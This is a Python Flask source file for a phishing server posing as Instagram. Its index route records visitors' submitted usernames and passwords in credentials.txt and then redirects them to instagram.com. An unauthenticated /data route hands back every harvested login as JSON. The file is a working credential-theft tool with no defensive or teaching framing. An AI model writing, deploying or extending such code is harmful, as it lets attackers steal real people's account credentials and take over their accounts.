from flask import Flask, render_template, request, redirect

from flask_limiter import Limiter
from flask_limiter.util import get_remote_address


app = Flask(__name__)
app.static_folder = "./templates"

limiter = Limiter(get_remote_address, app=app)


@app.route("/", methods=["GET"])
@limiter.limit("3 per hour")
def index():
    args = request.args

    if len(args) > 0:
        try:
            if "username" not in args.keys() and "password" not in args.keys():
                return redirect("https://instagram.com")

            if len(args.get("username")) > 20 or len(args.get("password")) > 30:
                return redirect("https://instagram.com")

            with open("credentials.txt", "a") as f:
                f.write(f"{args.get("username")}:{args.get("password")}\n")

        except:
            pass

        return redirect("https://instagram.com")

    return render_template("index.html")

@app.route("/data", methods=["GET"])
def data():
    data_ = {}
    with open("credentials.txt", 'r') as f:
        for chunk in f.readlines():
            local_data = chunk.split(':')

            data_[local_data[0]] = local_data[1]


    return data_

if __name__ == "__main__":
    app.run()
